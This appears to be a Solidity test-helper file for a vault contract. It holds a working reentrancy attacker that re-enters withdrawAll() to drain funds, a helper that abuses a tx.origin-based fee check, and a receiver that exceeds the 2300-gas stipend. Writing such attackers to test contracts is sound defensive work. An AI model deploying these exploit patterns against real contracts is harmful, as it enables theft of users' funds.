// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Helper contracts used only by the tests. They live in test/ so the
// Slither command (--filter-paths "node_modules|test") ignores them.

interface IVault {
    function deposit() external payable;
    function withdrawAll() external;
    function setFee(uint256 newFeeBps) external;
}

/// Re-entrancy attacker: re-enters withdrawAll() from receive() while the
/// vault still holds at least one more payout.
contract VaultAttacker {
    IVault public immutable vault;
    uint256 public reentries;

    constructor(address target) {
        vault = IVault(target);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            reentries++;
            vault.withdrawAll();
        }
    }
}

/// A contract the owner is tricked into calling. Because setFee() in the
/// original vault checks tx.origin, this contract can change the fee.
contract FeeSetterHelper {
    function setFeeOn(address vault, uint256 newFeeBps) external {
        IVault(vault).setFee(newFeeBps);
    }
}

/// A recipient (e.g. a multisig) whose receive() needs more than 2300 gas.
contract GasHungryReceiver {
    uint256 public received;

    receive() external payable {
        received += msg.value; // SSTORE costs far more than the 2300-gas stipend
    }
}
